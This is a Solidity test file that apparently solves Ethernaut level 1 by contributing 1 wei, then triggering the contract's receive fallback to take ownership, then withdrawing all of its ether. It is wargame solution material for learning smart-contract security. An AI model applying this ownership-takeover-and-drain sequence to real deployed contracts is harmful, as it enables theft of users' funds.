// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "test/Ethernaut.t.sol";

interface Level1 {
    function contribute() external payable;
    function withdraw() external;
}

contract Level1Test is EthernautTest {
    function testLevel1() public {
        _createLevel("1");
        Level1 levelInstance1 = Level1(levelInstance["1"]);

        // Contribute minimum amount of ether to ensure fallback passes
        levelInstance1.contribute{value: 1 wei}();
        // Send ether to receive fallback to gain ownership of contract
        (bool success,) = address(levelInstance1).call{value: 1 wei}("");
        // Withdraw all ether from contract
        levelInstance1.withdraw();

        require(_submitLevel("1"));
    }

    receive() external payable {
        // Fallback function to receive ether
    }
}
